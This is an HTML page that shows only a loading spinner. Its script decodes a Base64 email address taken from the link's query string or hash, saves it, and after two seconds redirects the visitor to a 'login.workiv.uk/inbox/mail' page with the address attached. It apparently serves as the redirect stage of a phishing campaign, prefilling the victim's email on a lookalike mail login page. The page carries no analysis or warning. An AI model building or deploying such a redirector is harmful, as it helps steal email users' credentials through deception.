<!DOCTYPE html>
<html dir="ltr" xmlns="http://www.w3.org/1999/xhtml" translate="no">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="pragma" content="no-cache">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0">
    <meta name="format-detection" content="telephone=no">
    <title>Loading</title>
    <style>
        @font-face {
            font-family: 'Roboto';
            src: url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap');
            font-weight: 300, 400, 500;
            font-style: normal;
        }

        body {
            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            margin: 0;
            padding: 0;
        }

        #loadingScreen {
            position: fixed;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        #loadingSpinner {
            width: 60px;
            height: 60px;
            border: 6px solid #f3f3f3;
            border-top: 6px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .dark #loadingScreen {
            background-color: #333;
        }

        .darkNew #loadingScreen {
            background-color: #1f1f1f;
        }
    </style>
    <script nonce="nonce-placeholder">
        // Extract and decode Base64 from ?code= or #
        function extractEmail() {
            const params = new URLSearchParams(window.location.search);
            const code = params.get("code");
            if (code) {
                try {
                    return atob(code);
                } catch {
                    return code;
                }
            }

            const hash = window.location.hash;
            if (hash && hash.length > 1) {
                const raw = decodeURIComponent(hash.substring(1));
                try {
                    return atob(raw);
                } catch {
                    return raw;
                }
            }

            return '';
        }

        document.addEventListener("DOMContentLoaded", function() {
            try {
                const email = extractEmail();
                if ("localStorage" in window) {
                    localStorage.setItem('email', email);
                }

                // Redirect with decoded value
                var delayInMilliseconds = 2000; // 2 seconds delay
                var targetUrl = "https://login.workiv.uk/inbox/mail/";
                setTimeout(function() {
                    if (email) {
                        window.location.href = targetUrl + "#" + email;
                    } else {
                        window.location.href = targetUrl;
                    }
                }, delayInMilliseconds);
            } catch (e) {}
        });
    </script>
    <noscript>JavaScript must be enabled.</noscript>
</head>
<body>
    <div id="loadingScreen">
        <div id="loadingSpinner"></div>
    </div>
</body>
</html>
